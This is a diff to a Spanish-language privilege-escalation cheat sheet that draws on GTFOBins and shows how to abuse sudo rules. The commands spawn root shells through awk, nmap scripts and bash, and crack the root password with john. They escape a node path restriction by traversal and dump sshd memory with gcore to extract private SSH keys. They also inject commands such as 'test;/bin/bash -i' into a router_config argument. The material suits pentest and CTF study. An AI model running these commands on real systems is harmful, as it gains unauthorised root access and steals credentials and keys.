@@ -16,8 +16,9 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 - **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
 
-## Sudoers 
+# Sudoers 
 
+### Find
 ```bash
 ❯ sudo -l    # Ejecutar el comando 'find' sin password
 	# (ALL : ALL) ALL
@@ -28,6 +29,7 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 ❯ sudo awk 'BEGIN {system("/bin/sh")}' 
 ```
 
+### Nmap como user2
 ```bash
 ❯ sudo -l      # Ejecutar el comando 'nmap' siendo 'user2' sin passwd
 	#  (user2) NOPASSWD: /usr/bin/nmap 
@@ -37,6 +39,7 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 ❯ sudo -u user2 nmap --script=/tmp/script.nse
 ```
 
+### Passwd como user2
 ```bash 
 ❯ sudo -l       # Cambiar de usuario sin password 
 	#  (user1 : user2) NOPASSWD: /bin/bash 
@@ -45,6 +48,7 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 ❯ sudo -u user2 /bin/bash     
 ```
 
+### Cat
 ```bash 
 ❯ sudo -l       # Ejecutar el comando 'cat' sin password 
 	#  (root) NOPASSWD: /bin/cat  
@@ -58,8 +62,9 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 ❯ john pwd.txt -w=/usr/share/wordlists/john.lst   # Obtener la password del usuario 'root'
 ```
 
+### Node
 ```bash 
-❯ sudo -l       # Ejecutar el comando 'node' sin password pero obligado a una ruta 
+❯ sudo -l     # Ejecutar el comando 'node' sin password pero obligado a una ruta 
 	# (ALL) /usr/bin/node /usr/local/scripts/*.js   
 
 Paso 1:
@@ -71,8 +76,9 @@ Paso 2:
 ❯ sudo /usr/bin/node /usr/local/scripts/../../../../tmp/esc.js   
 ```
 
+### Gcore
+Genera un dump de la memoria de un proceso activo. Si un proceso tiene credenciales, claves SSH, o datos sensibles en RAM, los podés extraer.
 ```bash 
-gcore es simple: genera un dump de la memoria de un proceso activo. Si un proceso tiene credenciales, claves SSH, o datos sensibles en RAM, los podés extraer.
 ❯ sudo -l       # Ejecutar el comando 'gcore' sin password
 	# (ALL) NOPASSWD: /usr/bin/gcore
 
@@ -96,4 +102,14 @@ Paso 3:
 ❯ strings core.$PID_SSHD | grep -iE "private|rsa|openssh|-----" | head -100
 # Extrae TODO lo que parece una key privada
 ❯ strings core.$PID_SSHD | sed -n '/PRIVATE KEY/,/END.*KEY/p'
+```
+
+### Router_Config 
+```bash 
+❯ sudo -l       # Ejecutar el comando 'router_config'
+	# (ALL) NOPASSWD: /usr/bin/router_config
+
+❯ sudo /usr/bin/router_config "test;whoami"
+❯ sudo /usr/bin/router_config "test;id"   # Mirar el ID de root 
+❯ sudo /usr/bin/router_config "test;/bin/bash -i"  # Obtener shell con root 
 ```
